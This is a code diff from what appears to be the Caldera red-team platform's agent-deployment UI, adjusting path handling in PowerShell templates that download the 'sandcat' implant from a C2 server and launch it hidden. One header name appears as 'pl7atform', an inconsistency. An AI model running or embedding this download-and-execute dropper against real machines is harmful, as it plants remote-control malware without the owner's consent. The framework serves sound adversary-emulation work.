@@ -105,11 +105,11 @@ $wc=New-Object System.Net.WebClient;
 $wc.Headers.add("pl7atform","windows");
 $wc.Headers.add("file","sandcat.go");
 $data=$wc.DownloadData($url);
-get-process | ? {$_.modules.filename -like "${implantFolder}${implantName}.exe"} | stop-process -f;
-rm -force "${implantFolder}${implantName}.exe" -ea ignore;
-[io.file]::WriteAllBytes("${implantFolder}${implantName}.exe",$data) | Out-Null;
-Start-Process -FilePath ${implantFolder}${implantName}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
-          code: `$server="${settings.caldera_public_url}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\${implantName}.exe"} | stop-process -f;rm -force "C:\\Users\\Public\\${implantName}.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\Users\\Public\\${implantName}.exe",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\${implantName}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
+get-process | ? {$_.modules.filename -like "${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe"} | stop-process -f;
+rm -force "${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe" -ea ignore;
+[io.file]::WriteAllBytes("${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe",$data) | Out-Null;
+Start-Process -FilePath ${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
+          code: `$server="${settings.caldera_public_url}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe"} | stop-process -f;rm -force "${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe" -ea ignore;[io.file]::WriteAllBytes("${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe",$data) | Out-Null;Start-Process -FilePath ${implantFolder.endsWith('/') ? implantFolder : `${implantFolder}/`}${implantName}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
         };
       case 'linux':
         return {
